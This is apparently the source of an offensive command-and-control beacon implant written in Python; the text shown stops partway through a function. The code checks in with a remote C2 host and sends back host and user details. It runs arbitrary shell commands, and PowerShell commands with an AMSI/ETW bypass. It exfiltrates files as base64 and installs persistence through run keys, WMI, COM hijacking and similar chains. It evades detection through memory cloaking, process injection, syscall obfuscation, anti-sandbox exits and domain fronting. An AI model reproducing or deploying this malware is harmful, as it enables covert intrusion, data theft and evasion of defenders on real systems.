"""
Evasive Beacon Agent - Elite Edition
Advanced C2 beacon with full EDR evasion and memory cloaking capabilities

Integrates:
- Sleep obfuscation with AI-adaptive jitter
- Sleepmask memory cloaking (ROP + Heap Spoof + Artifact Wipe)
- Header rotation for network evasion
- Anti-sandbox checks before execution
- AMSI/ETW bypass for PowerShell commands
- Traffic masking and domain fronting
"""
import os
import sys
import time
import json
import random
import base64
import hashlib
import platform
import subprocess
import threading
import urllib.request
import urllib.error
from typing import Dict, Optional, List, Callable, Any
from dataclasses import dataclass, field
from datetime import datetime

# Add parent directory for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import evasion modules
try:
    from evasion.sleep_obfuscation import SleepObfuscator, STEALTHY_PROFILE
    from evasion.header_rotation import HeaderRotator
    from evasion.anti_sandbox import SandboxDetector
    from evasion.traffic_masking import TrafficMasker, DomainFronter
    from evasion.amsi_bypass import AMSIBypass, ETWBypass
    EVASION_AVAILABLE = True
except ImportError:
    EVASION_AVAILABLE = False
    print("[!] Evasion modules not available, running in basic mode")

# NEW: Import sleepmask cloaking
try:
    from evasion.sleepmask_cloaking import (
        SleepmaskCloakingEngine,
        CloakLevel,
        EDRProduct,
        create_elite_cloaker,
        get_ai_recommendation
    )
    CLOAKING_AVAILABLE = True
except ImportError:
    CLOAKING_AVAILABLE = False
    SleepmaskCloakingEngine = None
    CloakLevel = None
    print("[!] Sleepmask cloaking not available")

# NEW: Import process injection masterclass
try:
    from evasion.process_injection_masterclass import (
        ProcessInjectionMasterclass,
        AIInjectionSelector,
        InjectionTechnique,
        InjectionConfig,
        EDRProduct as InjectionEDRProduct,
        create_masterclass_injector,
        quick_inject,
        get_ai_recommendation as get_injection_recommendation
    )
    INJECTION_AVAILABLE = True
except ImportError:
    INJECTION_AVAILABLE = False
    ProcessInjectionMasterclass = None
    InjectionTechnique = None
    print("[!] Process injection masterclass not available")

# NEW: Import syscall obfuscation monster
try:
    from evasion.syscall_obfuscator import (
        SyscallObfuscatorMonster,
        AIObfuscationSelector,
        GANStubMutator,
        ObfuscationLayer,
        EDRProfile as SyscallEDRProfile,
        StubPattern,
        SyscallObfuscationConfig,
        create_obfuscator_monster,
        quick_obfuscate_call,
        get_ai_recommendation as get_syscall_recommendation,
        detect_edr as detect_edr_for_syscall
    )
    SYSCALL_OBFUSCATOR_AVAILABLE = True
except ImportError:
    SYSCALL_OBFUSCATOR_AVAILABLE = False
    SyscallObfuscatorMonster = None
    ObfuscationLayer = None
    print("[!] Syscall obfuscation monster not available")

# NEW: Import persistence god mode
try:
    from evasion.persistence_god import (
        PersistenceGodMonster,
        AIPersistenceSelector,
        PersistenceChainExecutor,
        ArtifactMutator,
        SpoofEventGenerator,
        TimestampStomper,
        PersistenceArtifactWiper,
        PersistenceChain,
        EDRPersistProfile,
        MutationTarget,
        SpoofEventType,
        PersistenceConfig,
        create_persistence_god,
        quick_persist,
        get_ai_persist_recommendation,
        detect_edr_for_persist
    )
    PERSISTENCE_GOD_AVAILABLE = True
except ImportError:
    PERSISTENCE_GOD_AVAILABLE = False
    PersistenceGodMonster = None
    PersistenceChain = None
    print("[!] Persistence god mode not available")

# NEW: Import report generator pro
try:
    from tools.report_generator import (
        ReportGenerator,
        ReportConfig,
        ReportFormat,
        ReportResult,
        ChainLog,
        ChainLogEntry,
        SigmaRule,
        YARARule,
        MITREMapper,
        AISummaryGenerator,
        SigmaRuleGenerator,
        YARARuleGenerator,
        HTMLReportGenerator,
        PDFGenerator,
        DataAnonymizer,
        create_report_generator,
        quick_report,
        create_sample_chain_log,
        MITRE_TECHNIQUES
    )
    REPORT_GENERATOR_AVAILABLE = True
except ImportError:
    REPORT_GENERATOR_AVAILABLE = False
    ReportGenerator = None
    ChainLog = None
    ChainLogEntry = None
    print("[!] Report generator not available")


@dataclass
class BeaconConfig:
    """Beacon configuration"""
    c2_host: str
    c2_port: int = 443
    beacon_id: str = ""
    sleep_time: int = 60
    jitter_percent: int = 30
    kill_date: Optional[str] = None  # YYYY-MM-DD
    working_hours: Optional[tuple] = None  # (start_hour, end_hour)
    use_https: bool = True
    proxy: Optional[str] = None
    domain_front_host: Optional[str] = None
    traffic_profile: str = "google_search"
    max_retries: int = 3
    evasion_level: int = 3  # 1=low, 2=medium, 3=high, 4=elite
    # NEW: Sleepmask cloaking settings
    enable_cloaking: bool = True
    cloak_level: str = "ELITE"  # NONE, BASIC, STANDARD, ADVANCED, ELITE, PARANOID
    enable_heap_spoof: bool = True
    enable_artifact_wipe: bool = True
    enable_rop: bool = True
    remask_interval: int = 30  # Remask every N seconds during long sleeps
    # NEW: Process injection settings
    enable_injection: bool = True
    injection_technique: str = "ai_select"  # ai_select, ghosting, early_bird, etc.
    enable_ppid_spoof: bool = True
    enable_mutation: bool = True
    injection_delay_ms: int = 2000
    # NEW: Syscall obfuscation settings
    enable_syscall_obfuscation: bool = True
    syscall_obfuscation_layer: str = "full_monster"  # none, indirect_call, fresh_ssn, gan_mutate, full_monster
    syscall_use_ml: bool = True
    syscall_mutation_rate: float = 0.8
    syscall_use_fresh_ssn: bool = True
    syscall_enable_spoof: bool = True
    syscall_junk_ratio: float = 0.5
    # NEW: Persistence god mode settings
    enable_persistence_god: bool = True
    persistence_chain: str = "ai_select"  # ai_select, bits_job, com_hijack, runkey, full_chain, etc.
    persistence_ai_adaptive: bool = True
    persistence_multi_chain: bool = True
    persistence_mutation_rate: float = 0.8
    persistence_enable_spoof: bool = True
    persistence_timestamp_stomp: bool = True
    persistence_artifact_wipe: bool = True
    persistence_use_reg_muting: bool = True
    # NEW: Reporting settings
    enable_reporting: bool = True
    report_format: str = "html"  # html, pdf, json, markdown, all
    report_auto_generate: bool = True
    report_anonymize: bool = True
    report_include_sigma: bool = True
    report_include_mitre: bool = True
    report_output_dir: str = "reports"
    report_theme: str = "hacker"  # dark, light, hacker


@dataclass
class BeaconState:
    """Current beacon state"""
    is_running: bool = False
    last_checkin: Optional[datetime] = None
    tasks_completed: int = 0
    errors: int = 0
    sandbox_detected: bool = False
    evasion_active: bool = False
    # NEW: Chain log tracking
    chain_log_entries: List[Dict] = field(default_factory=list)


class EvasiveBeacon:
    """
    Advanced C2 beacon with EDR evasion and memory cloaking capabilities.
    
    Features:
    - Encrypted sleep with memory obfuscation
    - Sleepmask cloaking (ROP + Heap Spoof + Artifact Wipe)
    - HTTP header and TLS fingerprint rotation
    - Anti-sandbox detection
    - Traffic masking (mimics legitimate apps)
    - Domain fronting support
    - Kill date and working hours
    - AMSI/ETW bypass for PowerShell
    """
    
    def __init__(self, config: BeaconConfig):
        self.config = config
        self.state = BeaconState()
        
        # Generate unique beacon ID if not provided
        if not config.beacon_id:
            self.config.beacon_id = self._generate_beacon_id()
        
        # Initialize evasion components
        if EVASION_AVAILABLE and config.evasion_level > 0:
            self._init_evasion()
        else:
            self.sleep_obfuscator = None
            self.header_rotator = None
            self.sandbox_detector = None
            self.traffic_masker = None
        
        # NEW: Initialize sleepmask cloaking
        self.cloaking_engine = None
        if CLOAKING_AVAILABLE and config.enable_cloaking:
            self._init_cloaking()
        
        # NEW: Initialize process injection engine
        self.injection_engine = None
        if INJECTION_AVAILABLE and config.enable_injection:
            self._init_injection()
        
        # NEW: Initialize syscall obfuscation engine
        self.syscall_obfuscator = None
        if SYSCALL_OBFUSCATOR_AVAILABLE and config.enable_syscall_obfuscation:
            self._init_syscall_obfuscator()
        
        # NEW: Initialize persistence god engine
        self.persistence_god = None
        if PERSISTENCE_GOD_AVAILABLE and config.enable_persistence_god:
            self._init_persistence_god()
        
        # NEW: Initialize report generator
        self.report_generator = None
        if REPORT_GENERATOR_AVAILABLE and config.enable_reporting:
            self._init_report_generator()
        
        # Task handlers
        self.task_handlers: Dict[str, Callable] = {
            "cmd": self._handle_cmd,
            "shell": self._handle_shell,
            "powershell": self._handle_powershell,
            "download": self._handle_download,
            "upload": self._handle_upload,
            "screenshot": self._handle_screenshot,
            "keylog": self._handle_keylog,
            "persist": self._handle_persist,
            "migrate": self._handle_migrate,
            "inject": self._handle_inject,  # NEW
            "report": self._handle_report,  # NEW: Report generation handler
            "exit": self._handle_exit,
        }
        
        # Queued tasks
        self.task_queue: List[Dict] = []
        self.results_queue: List[Dict] = []
    
    def _generate_beacon_id(self) -> str:
        """Generate unique beacon identifier"""
        data = f"{platform.node()}-{platform.machine()}-{os.getpid()}-{time.time()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]
    
    def _init_cloaking(self):
        """Initialize sleepmask cloaking engine"""
        if not CLOAKING_AVAILABLE:
            return
        
        try:
            # Parse cloak level
            level_map = {
                'NONE': CloakLevel.NONE,
                'BASIC': CloakLevel.BASIC,
                'STANDARD': CloakLevel.STANDARD,
                'ADVANCED': CloakLevel.ADVANCED,
                'ELITE': CloakLevel.ELITE,
                'PARANOID': CloakLevel.PARANOID
            }
            cloak_level = level_map.get(
                self.config.cloak_level.upper(), 
                CloakLevel.ELITE
            )
            
            # Create engine with config
            self.cloaking_engine = SleepmaskCloakingEngine(
                auto_detect_edr=True,
                cloak_level=cloak_level,
                enable_heap_spoof=self.config.enable_heap_spoof,
                enable_artifact_wipe=self.config.enable_artifact_wipe,
                enable_rop=self.config.enable_rop
            )
            
            print(f"[+] Sleepmask cloaking initialized: {cloak_level.name}")
            print(f"    Detected EDR: {self.cloaking_engine.detected_edr}")
            
        except Exception as e:
            print(f"[!] Failed to initialize cloaking: {e}")
            self.cloaking_engine = None
    
    def _init_injection(self):
        """Initialize process injection masterclass engine"""
        if not INJECTION_AVAILABLE:
            return
        
        try:
            # Determine technique
            technique = None
            if self.config.injection_technique != "ai_select":
                technique_map = {
                    'ghosting': InjectionTechnique.PROCESS_GHOSTING,
                    'herpaderping': InjectionTechnique.PROCESS_HERPADERPING,
                    'transacted_hollowing': InjectionTechnique.TRANSACTED_HOLLOWING,
                    'doppelganging': InjectionTechnique.PROCESS_DOPPELGANGING,
                    'module_stomping': InjectionTechnique.MODULE_STOMPING,
                    'early_bird_apc': InjectionTechnique.EARLY_BIRD_APC,
                    'early_bird': InjectionTechnique.EARLY_BIRD_APC,
                    'thread_hijack': InjectionTechnique.THREAD_HIJACK,
                    'hollowing': InjectionTechnique.PROCESS_HOLLOWING,
                    'syscall': InjectionTechnique.SYSCALL_INJECTION,
                    'classic_crt': InjectionTechnique.CLASSIC_CRT,
                }
                technique = technique_map.get(
                    self.config.injection_technique.lower(),
                    None
                )
            
            # Create config
            config = InjectionConfig(
                technique=technique or InjectionTechnique.EARLY_BIRD_APC,
                ai_adaptive=self.config.injection_technique == "ai_select",
                auto_detect_edr=True,
                enable_ppid_spoof=self.config.enable_ppid_spoof,
                enable_mutation=self.config.enable_mutation,
                enable_artifact_wipe=self.config.enable_artifact_wipe,
                delay_execution_ms=self.config.injection_delay_ms,
            )
            
            # Create engine
            self.injection_engine = ProcessInjectionMasterclass(config)
            
            # Get AI recommendation
            selector = AIInjectionSelector(config)
            rec_technique, profile_info = selector.detect_and_select()
            
            print(f"[+] Process injection initialized: AI={self.config.injection_technique == 'ai_select'}")
            print(f"    Primary technique: {rec_technique.value}")
            print(f"    Detected EDR: {profile_info.get('profile', {}).get('name', 'None')}")
            print(f"    PPID Spoof: {self.config.enable_ppid_spoof}")
            print(f"    Mutation: {self.config.enable_mutation}")
            
        except Exception as e:
            print(f"[!] Failed to initialize injection engine: {e}")
            self.injection_engine = None
    
    def _init_syscall_obfuscator(self):
        """Initialize syscall obfuscation monster engine"""
        if not SYSCALL_OBFUSCATOR_AVAILABLE:
            return
        
        try:
            # Parse layer
            layer_map = {
                'none': ObfuscationLayer.NONE,
                'indirect_call': ObfuscationLayer.INDIRECT_CALL,
                'fresh_ssn': ObfuscationLayer.FRESH_SSN,
                'obfuscated_stub': ObfuscationLayer.OBFUSCATED_STUB,
                'gan_mutate': ObfuscationLayer.GAN_MUTATE,
                'entropy_heavy': ObfuscationLayer.ENTROPY_HEAVY,
                'stub_swap': ObfuscationLayer.STUB_SWAP,
                'full_monster': ObfuscationLayer.FULL_MONSTER,
            }
            
            layer = layer_map.get(
                self.config.syscall_obfuscation_layer.lower(),
                ObfuscationLayer.FULL_MONSTER
            )
            
            # Create config
            syscall_config = SyscallObfuscationConfig(
                ai_adaptive=True,  # Always use AI adaptive
                use_ml_mutation=self.config.syscall_use_ml,
                use_fresh_ntdll=self.config.syscall_use_fresh_ssn,
                enable_spoof_calls=self.config.syscall_enable_spoof,
                mutation_rate=self.config.syscall_mutation_rate,
                junk_instruction_ratio=self.config.syscall_junk_ratio,
            )
            
            # Create engine
            self.syscall_obfuscator = SyscallObfuscatorMonster(syscall_config)
            
            # Get AI recommendation
            selector = AIObfuscationSelector()
            rec_layer, profile_info = selector.detect_and_select()
            
            profile = profile_info.get('profile', {})
            
            print(f"[+] Syscall obfuscator initialized: layer={layer.value}")
            print(f"    AI recommended: {rec_layer.value}")
            print(f"    Detected EDR: {profile.get('name', 'None')}")
            print(f"    ML mutation: {self.config.syscall_use_ml}")
            print(f"    Mutation rate: {self.config.syscall_mutation_rate}")
            print(f"    Fresh SSN: {self.config.syscall_use_fresh_ssn}")
            print(f"    Spoof calls: {self.config.syscall_enable_spoof}")
            
        except Exception as e:
            print(f"[!] Failed to initialize syscall obfuscator: {e}")
            self.syscall_obfuscator = None
    
    def _init_persistence_god(self):
        """Initialize persistence god mode engine"""
        if not PERSISTENCE_GOD_AVAILABLE:
            return
        
        try:
            # Parse chain
            chain = None
            if self.config.persistence_chain != "ai_select":
                chain_map = {
                    'wmi_event': PersistenceChain.WMI_EVENT,
                    'com_hijack': PersistenceChain.COM_HIJACK,
                    'bits_job': PersistenceChain.BITS_JOB,
                    'schtask': PersistenceChain.SCHTASK,
                    'runkey': PersistenceChain.RUNKEY,
                    'service': PersistenceChain.SERVICE,
                    'dll_search': PersistenceChain.DLL_SEARCH_ORDER,
                    'startup_folder': PersistenceChain.STARTUP_FOLDER,
                    'full_chain': PersistenceChain.FULL_CHAIN,
                }
                chain = chain_map.get(
                    self.config.persistence_chain.lower(),
                    None
                )
            
            # Create config
            persist_config = PersistenceConfig(
                ai_adaptive=self.config.persistence_ai_adaptive or self.config.persistence_chain == "ai_select",
                enable_multi_chain=self.config.persistence_multi_chain,
                enable_spoof_events=self.config.persistence_enable_spoof,
                mutation_rate=self.config.persistence_mutation_rate,
                timestamp_stomp=self.config.persistence_timestamp_stomp,
                artifact_wipe=self.config.persistence_artifact_wipe,
                use_reg_muting=self.config.persistence_use_reg_muting,
            )
            
            # Create engine
            self.persistence_god = PersistenceGodMonster(persist_config)
            
            # Get AI recommendation
            selector = AIPersistenceSelector()
            rec_chain, profile_info = selector.detect_and_select()
            
            profile = profile_info.get('profile', {})
            
            print(f"[+] Persistence god initialized: AI={self.config.persistence_ai_adaptive}")
            print(f"    Primary chain: {rec_chain.value}")
            print(f"    Detected EDR: {profile.get('name', 'None')}")
            print(f"    Multi-chain: {self.config.persistence_multi_chain}")
            print(f"    Mutation rate: {self.config.persistence_mutation_rate}")
            print(f"    Spoof events: {self.config.persistence_enable_spoof}")
            print(f"    Timestamp stomp: {self.config.persistence_timestamp_stomp}")
            print(f"    Artifact wipe: {self.config.persistence_artifact_wipe}")
            print(f"    Registry muting: {self.config.persistence_use_reg_muting}")
            
            # Show recommendation
            rec = selector.get_recommendation()
            if rec:
                print(f"    AI Recommendation: {rec[:100]}...")
            
        except Exception as e:
            print(f"[!] Failed to initialize persistence god: {e}")
            self.persistence_god = None
    
    def _init_report_generator(self):
        """Initialize report generator engine"""
        if not REPORT_GENERATOR_AVAILABLE:
            return
        
        try:
            # Parse format
            format_map = {
                'html': ReportFormat.HTML,
                'pdf': ReportFormat.PDF,
                'json': ReportFormat.JSON,
                'markdown': ReportFormat.MARKDOWN,
                'all': ReportFormat.ALL,
            }
            report_format = format_map.get(
                self.config.report_format.lower(),
                ReportFormat.HTML
            )
            
            # Create config
            report_config = ReportConfig(
                enable_ai_summary=True,
                enable_mitre_map=self.config.report_include_mitre,
                enable_sigma_generate=self.config.report_include_sigma,
                format=report_format,
                output_dir=self.config.report_output_dir,
                anonymize_data=self.config.report_anonymize,
                theme=self.config.report_theme,
            )
            
            # Create generator
            self.report_generator = ReportGenerator(report_config)
            
            print(f"[+] Report generator initialized: {report_format.name}")
            print(f"    Format: {self.config.report_format}")
            print(f"    Output dir: {self.config.report_output_dir}")
            print(f"    Anonymize: {self.config.report_anonymize}")
            print(f"    Theme: {self.config.report_theme}")
            print(f"    Include Sigma: {self.config.report_include_sigma}")
            print(f"    Include MITRE: {self.config.report_include_mitre}")
            
        except Exception as e:
            print(f"[!] Failed to initialize report generator: {e}")
            self.report_generator = None
    
    def _init_evasion(self):
        """Initialize evasion components"""
        self.state.evasion_active = True
        
        # Sleep obfuscation
        self.sleep_obfuscator = SleepObfuscator(
            base_sleep=self.config.sleep_time,
            jitter_percent=self.config.jitter_percent
        )
        
        # Header rotation
        self.header_rotator = HeaderRotator()
        
        # Sandbox detection
        self.sandbox_detector = SandboxDetector()
        
        # Traffic masking
        self.traffic_masker = TrafficMasker()
        
        # Domain fronting (if configured)
        if self.config.domain_front_host:
            self.domain_fronter = DomainFronter()
        else:
            self.domain_fronter = None
    
    def pre_flight_checks(self) -> bool:
        """
        Run pre-flight checks before beaconing.
        Returns False if environment is hostile.
        """
        # Check kill date
        if self.config.kill_date:
            if datetime.now().strftime("%Y-%m-%d") >= self.config.kill_date:
                print("[!] Kill date reached, exiting")
                return False
        
        # Check working hours
        if self.config.working_hours:
            current_hour = datetime.now().hour
            start_hour, end_hour = self.config.working_hours
            if not (start_hour <= current_hour < end_hour):
                print(f"[*] Outside working hours ({start_hour}-{end_hour}), sleeping")
                time.sleep(3600)  # Sleep 1 hour
                return self.pre_flight_checks()  # Re-check
        
        # Sandbox detection (if evasion enabled)
        if self.sandbox_detector and self.config.evasion_level >= 2:
            result = self.sandbox_detector.run_all_checks()
            if result['is_sandbox']:
                self.state.sandbox_detected = True
                print(f"[!] Sandbox detected: {result['detection_reason']}")
                
                if self.config.evasion_level >= 3:
                    # High evasion: exit silently
                    return False
                # Medium evasion: continue but be cautious
        
        return True
    
    def run(self):
        """Main beacon loop"""
        print(f"[*] Beacon starting: {self.config.beacon_id}")
        
        # Pre-flight checks
        if not self.pre_flight_checks():
            return
        
        self.state.is_running = True
        consecutive_errors = 0
        
        while self.state.is_running:
            try:
                # Check in with C2
                tasks = self._checkin()
                
                # Process received tasks
                if tasks:
                    for task in tasks:
                        self._execute_task(task)
                
                # Send results
                if self.results_queue:
                    self._send_results()
                
                consecutive_errors = 0
                
            except Exception as e:
                consecutive_errors += 1
                self.state.errors += 1
                print(f"[!] Beacon error: {e}")
                
                if consecutive_errors >= self.config.max_retries:
                    print("[!] Max consecutive errors reached, increasing sleep")
                    # Exponential backoff
                    self.config.sleep_time = min(
                        self.config.sleep_time * 2,
                        3600  # Max 1 hour
                    )
            
            # Sleep with obfuscation and cloaking
            self._evasive_sleep()
    
    def _evasive_sleep(self):
        """
        Sleep with memory cloaking and obfuscation.
        
        Stages:
        1. Pre-sleep cloak (mask memory, create decoys, wipe artifacts)
        2. Sleep with jitter
        3. Remask cycles during long sleeps
        4. Post-sleep uncloak
        """
        # Calculate sleep time
        if self.sleep_obfuscator:
            sleep_time = self.sleep_obfuscator.get_sleep_time()
        else:
            jitter = random.uniform(
                -self.config.jitter_percent/100,
                self.config.jitter_percent/100
            )
            sleep_time = self.config.sleep_time * (1 + jitter)
        
        # Pre-sleep cloaking
        if self.cloaking_engine:
            cloak_result = self.cloaking_engine.pre_sleep_cloak(
                callback=lambda stage, prog: None  # Silent callback
            )
            if cloak_result['success']:
                print(f"[*] Cloaked: {cloak_result['cloaked_regions']} regions, "
                      f"{cloak_result['heap_decoys']} decoys")
        
        print(f"[*] Sleeping {sleep_time:.1f}s (cloaked)")
        
        # Sleep with remask cycles for long sleeps
        if self.cloaking_engine and sleep_time > self.config.remask_interval:
            elapsed = 0
            while elapsed < sleep_time:
                # Sleep for one remask interval
                chunk = min(self.config.remask_interval, sleep_time - elapsed)
                time.sleep(chunk)
                elapsed += chunk
                
                # Remask if still sleeping
                if elapsed < sleep_time:
                    self.cloaking_engine.remask_cycle()
        else:
            # Short sleep - no remask needed
            if self.sleep_obfuscator:
                self.sleep_obfuscator.sleep()
            else:
                time.sleep(sleep_time)
        
        # Post-sleep uncloak
        if self.cloaking_engine:
            self.cloaking_engine.post_sleep_uncloak()
    
    def get_cloaking_status(self) -> Dict[str, Any]:
        """Get current cloaking engine status"""
        if not self.cloaking_engine:
            return {'available': False, 'reason': 'Cloaking not initialized'}
        
        return {
            'available': True,
            **self.cloaking_engine.get_status()
        }
    
    def _build_request(self, endpoint: str, data: Dict = None) -> urllib.request.Request:
        """Build HTTP request with evasion techniques"""
        protocol = "https" if self.config.use_https else "http"
        
        # Domain fronting
        if self.domain_fronter and self.config.domain_front_host:
            # Connect to CDN, send Host header to real C2
            url = f"{protocol}://{self.config.domain_front_host}:{self.config.c2_port}{endpoint}"
            real_host = self.config.c2_host
        else:
            url = f"{protocol}://{self.config.c2_host}:{self.config.c2_port}{endpoint}"
            real_host = None
        
        # Traffic masking
        if self.traffic_masker:
            masked = self.traffic_masker.mask_request(
                json.dumps(data or {}).encode(),
                self.config.traffic_profile
            )
            headers = masked['headers']
        else:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json"
            }
        
        # Header rotation
        if self.header_rotator:
            rotated = self.header_rotator.get_headers()
            headers.update(rotated)
        
        # Build request
        if data:
            body = json.dumps(data).encode()
            req = urllib.request.Request(url, data=body, method='POST')
        else:
            req = urllib.request.Request(url, method='GET')
        
        for key, value in headers.items():
            req.add_header(key, value)
        
        # Override Host header for domain fronting
        if real_host:
            req.add_header('Host', real_host)
        
        return req
    
    def _checkin(self) -> Optional[List[Dict]]:
        """Check in with C2 server"""
        data = {
            "id": self.config.beacon_id,
            "hostname": platform.node(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "os": platform.system(),
            "arch": platform.machine(),
            "pid": os.getpid(),
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            req = self._build_request("/beacon/checkin", data)
            
            # Use proxy if configured
            if self.config.proxy:
                proxy_handler = urllib.request.ProxyHandler({
                    "http": self.config.proxy,
                    "https": self.config.proxy
                })
                opener = urllib.request.build_opener(proxy_handler)
            else:
                opener = urllib.request.build_opener()
            
            response = opener.open(req, timeout=30)
            self.state.last_checkin = datetime.now()
            
            result = json.loads(response.read().decode())
            return result.get('tasks', [])
            
        except urllib.error.URLError as e:
            raise ConnectionError(f"Failed to check in: {e}")
    
    def _send_results(self):
        """Send task results to C2"""
        if not self.results_queue:
            return
        
        data = {
            "id": self.config.beacon_id,
            "results": self.results_queue
        }
        
        try:
            req = self._build_request("/beacon/results", data)
            opener = urllib.request.build_opener()
            opener.open(req, timeout=30)
            self.results_queue.clear()
        except Exception as e:
            print(f"[!] Failed to send results: {e}")
    
    def _execute_task(self, task: Dict):
        """Execute a task from C2"""
        task_type = task.get('type', 'cmd')
        task_id = task.get('id', 'unknown')
        
        handler = self.task_handlers.get(task_type)
        if not handler:
            self.results_queue.append({
                "task_id": task_id,
                "success": False,
                "error": f"Unknown task type: {task_type}"
            })
            return
        
        try:
            result = handler(task)
            self.results_queue.append({
                "task_id": task_id,
                "success": True,
                "output": result
            })
            self.state.tasks_completed += 1
        except Exception as e:
            self.results_queue.append({
                "task_id": task_id,
                "success": False,
                "error": str(e)
            })
    
    # Task Handlers
    def _handle_cmd(self, task: Dict) -> str:
        """Execute system command"""
        cmd = task.get('command', '')
        if not cmd:
            raise ValueError("No command specified")
        
        if platform.system() == "Windows":
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=300
            )
        else:
            result = subprocess.run(
                ['sh', '-c', cmd], capture_output=True, text=True, timeout=300
            )
        
        return result.stdout + result.stderr
    
    def _handle_shell(self, task: Dict) -> str:
        """Execute shell command (alias for cmd)"""
        return self._handle_cmd(task)
    
    def _handle_powershell(self, task: Dict) -> str:
        """Execute PowerShell with AMSI bypass"""
        script = task.get('script', '')
        if not script:
            raise ValueError("No script specified")
        
        if platform.system() != "Windows":
            raise OSError("PowerShell only available on Windows")
        
        # AMSI bypass if evasion enabled
        if EVASION_AVAILABLE and self.config.evasion_level >= 2:
            amsi = AMSIBypass()
            etw = ETWBypass()
            
            # Prepend bypass to script
            full_script = amsi.get_bypass_code('reflection') + "\n"
            full_script += etw.get_etw_bypass_code('patch') + "\n"
            full_script += script
        else:
            full_script = script
        
        # Encode script
        encoded = base64.b64encode(full_script.encode('utf-16-le')).decode()
        
        result = subprocess.run(
            ['powershell.exe', '-NoProfile', '-NonInteractive',
             '-EncodedCommand', encoded],
            capture_output=True, text=True, timeout=300
        )
        
        return result.stdout + result.stderr
    
    def _handle_download(self, task: Dict) -> str:
        """Download file from target"""
        filepath = task.get('path', '')
        if not filepath or not os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")
        
        with open(filepath, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        return json.dumps({
            "filename": os.path.basename(filepath),
            "size": os.path.getsize(filepath),
            "content": content
        })
    
    def _handle_upload(self, task: Dict) -> str:
        """Upload file to target"""
        filepath = task.get('path', '')
        content = task.get('content', '')
        
        if not filepath or not content:
            raise ValueError("Missing path or content")
        
        data = base64.b64decode(content)
        with open(filepath, 'wb') as f:
            f.write(data)
        
        return f"File written: {filepath} ({len(data)} bytes)"
    
    def _handle_screenshot(self, task: Dict) -> str:
        """Take screenshot"""
        try:
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            content = base64.b64encode(buffer.getvalue()).decode()
            
            return json.dumps({
                "filename": "screenshot.png",
                "content": content
            })
        except ImportError:
            raise RuntimeError("PIL not available for screenshots")
    
    def _handle_keylog(self, task: Dict) -> str:
        """Start/stop keylogger"""
        action = task.get('action', 'status')
        # Placeholder - would need pynput or similar
        return f"Keylogger action: {action}"
    
    def _handle_persist(self, task: Dict) -> str:
        """
        Establish persistence using Persistence God Mode.
        
        Supports:
        - AI-adaptive chain selection
        - Multi-chain persistence
        - Artifact mutation
        - Spoof events
        - Timestamp stomping
        - Artifact wiping
        """
        method = task.get('method', 'ai_select')
        payload_path = task.get('payload_path', os.path.abspath(__file__))
        callback_host = task.get('callback_host', self.config.c2_host)
        callback_port = task.get('callback_port', self.config.c2_port)
        
        # Use persistence god if available and on Windows
        if self.persistence_god and platform.system() == "Windows":
            return self._persist_god_mode(
                method=method,
                payload_path=payload_path,
                callback_host=callback_host,
                callback_port=callback_port
            )
        
        # Fallback to legacy methods
        if platform.system() != "Windows":
            # Linux persistence
            if method == 'cron':
                return self._persist_cron()
            elif method == 'bashrc':
                return self._persist_bashrc()
        else:
            # Windows persistence (legacy)
            if method == 'registry':
                return self._persist_registry()
            elif method == 'schtasks':
                return self._persist_schtasks()
        
        return f"Persistence method {method} not implemented"
    
    def _persist_god_mode(
        self,
        method: str = "ai_select",
        payload_path: str = None,
        callback_host: str = None,
        callback_port: int = None
    ) -> str:
        """
        Install persistence using Persistence God Mode.
        
        Full chain with AI-adaptive selection, mutation, spoof, and wipe.
        """
        if not self.persistence_god:
            return "Persistence God not available"
        
        try:
            # Build payload callback
            if not payload_path:
                payload_path = os.path.abspath(__file__)
            
            callback = f"pythonw.exe {payload_path}"
            if callback_host and callback_port:
                callback = f"pythonw.exe {payload_path} --c2 {callback_host}:{callback_port}"
            
            # Determine chain
            if method == "ai_select" or method == "full_chain":
                # Use AI-selected full chain
                result = self.persistence_god.persist(
                    payload_callback=callback,
                    use_full_chain=method == "full_chain"
                )
            else:
                # Map to specific chain
                chain_map = {
                    'wmi_event': PersistenceChain.WMI_EVENT,
                    'wmi': PersistenceChain.WMI_EVENT,
                    'com_hijack': PersistenceChain.COM_HIJACK,
                    'com': PersistenceChain.COM_HIJACK,
                    'bits_job': PersistenceChain.BITS_JOB,
                    'bits': PersistenceChain.BITS_JOB,
                    'schtask': PersistenceChain.SCHTASK,
                    'scheduled_task': PersistenceChain.SCHTASK,
                    'runkey': PersistenceChain.RUNKEY,
                    'registry': PersistenceChain.RUNKEY,
                    'service': PersistenceChain.SERVICE,
                    'dll_search': PersistenceChain.DLL_SEARCH_ORDER,
                    'dll': PersistenceChain.DLL_SEARCH_ORDER,
                    'startup_folder': PersistenceChain.STARTUP_FOLDER,
                    'startup': PersistenceChain.STARTUP_FOLDER,
                }
                
                chain = chain_map.get(method.lower(), PersistenceChain.RUNKEY)
                
                # Install specific chain
                result = self.persistence_god.persist(
                    payload_callback=callback,
                    chain=chain
                )
            
            # Build response
            if result.get('success'):
                installed = result.get('chains_installed', [])
                artifacts = result.get('mutated_artifacts', [])
                spoofed = result.get('spoofed_events', 0)
                wiped = result.get('artifacts_wiped', [])
                
                response = [
                    f"Persistence God Mode: SUCCESS",
                    f"  Chains installed: {', '.join(installed)}",
                    f"  Artifacts mutated: {len(artifacts)}",
                    f"  Spoof events: {spoofed}",
                    f"  Artifacts wiped: {len(wiped)}",
                ]
                
                if result.get('detected_edr'):
                    response.append(f"  Detected EDR: {result['detected_edr']}")
                
                return "\n".join(response)
            else:
                return f"Persistence God Mode FAILED: {result.get('error', 'Unknown error')}"
                
        except Exception as e:
            return f"Persistence God Mode ERROR: {str(e)}"
    
    def get_persistence_status(self) -> Dict[str, Any]:
        """
        Get status of installed persistence chains.
        
        Returns:
            Dict with persistence status info
        """
        result = {
            'persistence_god_available': self.persistence_god is not None,
            'chains_installed': [],
            'ai_recommendation': None,
